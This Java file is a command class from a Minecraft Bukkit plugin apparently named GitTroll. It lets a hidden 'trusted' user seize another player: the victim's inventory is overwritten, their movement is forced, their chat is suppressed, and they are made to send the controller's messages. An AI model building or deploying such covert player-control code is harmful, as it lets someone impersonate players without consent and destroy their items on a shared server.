package net.Lenni0451.GitTroll.command.commands.player;

import java.util.List;
import java.util.Map;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.event.player.PlayerQuitEvent;

import com.google.common.collect.BiMap;
import com.google.common.collect.HashBiMap;

import net.Lenni0451.GitTroll.GitTroll;
import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.event.EventListener;
import net.Lenni0451.GitTroll.event.events.EventPlayerPacket;
import net.Lenni0451.GitTroll.event.types.Event;
import net.Lenni0451.GitTroll.manager.CommandManager;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;
import net.minecraft.server.v1_8_R3.PacketPlayInArmAnimation;
import net.minecraft.server.v1_8_R3.PacketPlayInChat;
import net.minecraft.server.v1_8_R3.PacketPlayOutAnimation;

public class Control extends CommandBase implements Listener, EventListener {
	
	BiMap<CustomPlayer, CustomPlayer> controlledPlayers = HashBiMap.create();
	
	public Control() {
		super("Control", "Control a player", "<Player>");
		
		Bukkit.getScheduler().runTaskTimer(GitTroll.getInstance(), () -> {
			try {
				for(Map.Entry<CustomPlayer, CustomPlayer> entry : this.controlledPlayers.entrySet()) {
					Player controller = entry.getKey().getPlayer();
					Player controlled = entry.getValue().getPlayer();
					
					controlled.getInventory().setArmorContents(controller.getInventory().getArmorContents());
					controlled.getInventory().setContents(controller.getInventory().getContents());
					controlled.getInventory().setHeldItemSlot(controller.getInventory().getHeldItemSlot());
					
					controlled.closeInventory();
					
					controlled.setSneaking(controller.isSneaking());
					controlled.setSprinting(controller.isSprinting());
				}
			} catch (Exception e) {}
		}, 1, 1);
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isLength(1)) {
			CustomPlayer vic = this.parsePlayer(args.getString(0), executor);
			
			if(executor.equals(vic)) {
				executor.sendGitMessage("§cYou can't control yourself!");
			} else if(controlledPlayers.containsValue(vic)) {
				if(controlledPlayers.inverse().get(vic).equals(executor)) {
					executor.getPlayer().showPlayer(vic.getPlayer());
					this.controlledPlayers.remove(executor);
					executor.sendGitMessage("§cStopped controlling player.");
				} else {
					executor.sendGitMessage("§cThis player is already controlled by another player.");
				}
			} else if(controlledPlayers.containsKey(vic)) {
				executor.sendGitMessage("§cThis player is currently controlling another player.");
			} else {
				executor.getPlayer().hidePlayer(vic.getPlayer());
				GitTroll.getInstance().commandManager.Vanish.enableVanish(executor.getPlayer());
				this.controlledPlayers.put(executor, vic);
				executor.sendGitMessage("Started controlling player.");
			}
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {
		if(args.isEmpty()) {
			this.tabCompletePlayers(tabComplete);
		}
	}
	
	@EventHandler
	public void onMove(PlayerMoveEvent event) {
		CustomPlayer player = CustomPlayer.instanceOf(event.getPlayer());
		if(this.controlledPlayers.inverse().containsKey(player)) {
			event.setCancelled(true);
			event.getPlayer().teleport(this.controlledPlayers.inverse().get(player).getPlayer().getLocation());
		} else if(this.controlledPlayers.containsKey(player)) {
			this.controlledPlayers.get(player).getPlayer().teleport(player.getPlayer().getLocation());
		}
	}

	@Override
	public void onEvent(Event event) {
		if(event instanceof EventPlayerPacket) {
			EventPlayerPacket e = (EventPlayerPacket) event;
			if(e.getPacket() instanceof PacketPlayInChat && this.controlledPlayers.containsValue(CustomPlayer.instanceOf(e.getPlayer()))) {
				e.setCancelled(true);
			} else if(e.getPacket() instanceof PacketPlayInArmAnimation && this.controlledPlayers.containsKey(CustomPlayer.instanceOf(e.getPlayer()))) {
				for(Player player : Bukkit.getOnlinePlayers()) {
					CustomPlayer cPlayer = CustomPlayer.instanceOf(player);
					cPlayer.sendPacket(new PacketPlayOutAnimation(this.controlledPlayers.get(CustomPlayer.instanceOf(e.getPlayer())).getCraftPlayer().getHandle(), 0));
				}
			}
		}
	}
	
	@EventHandler
	public void onMessage(AsyncPlayerChatEvent event) {
		CustomPlayer player = CustomPlayer.instanceOf(event.getPlayer());
		if(player.isTrusted() && event.getMessage().toLowerCase().startsWith(CommandManager.COMMAND_PREFIX)) {
			return;
		}
		if(this.controlledPlayers.containsKey(player)) {
			event.setCancelled(true);
			this.controlledPlayers.get(player).sudo(event.getMessage());
		}
	}
	
	@EventHandler
	public void onQuit(PlayerQuitEvent event) {
		CustomPlayer player = CustomPlayer.instanceOf(event.getPlayer());
		if(this.controlledPlayers.inverse().containsKey(player)) {
			CustomPlayer controller;
			this.controlledPlayers.remove(controller = this.controlledPlayers.inverse().get(player));
			controller.sendGitMessage("§cThe controlled player left the server. You now don't control a player anymore.");
		}
	}
	
	@EventHandler
	public void onBlockPlace(BlockPlaceEvent event) {
		if(this.controlledPlayers.containsValue(CustomPlayer.instanceOf(event.getPlayer()))) {
			event.setCancelled(true);
		}
	}
	
	@EventHandler
	public void onBlockPlace(BlockBreakEvent event) {
		if(this.controlledPlayers.containsValue(CustomPlayer.instanceOf(event.getPlayer()))) {
			event.setCancelled(true);
		}
	}
	
}
